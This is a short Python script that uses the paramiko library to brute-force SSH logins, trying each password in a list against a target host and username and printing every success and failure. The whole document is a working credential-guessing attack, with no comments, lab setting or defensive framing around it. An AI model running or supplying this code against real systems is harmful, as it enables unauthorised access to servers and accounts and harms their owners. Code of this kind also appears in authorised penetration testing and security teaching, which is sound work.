import paramiko

def brute_force_ssh(target, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Success: {username}:{password}")
            ssh.close()
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {username}:{password}")
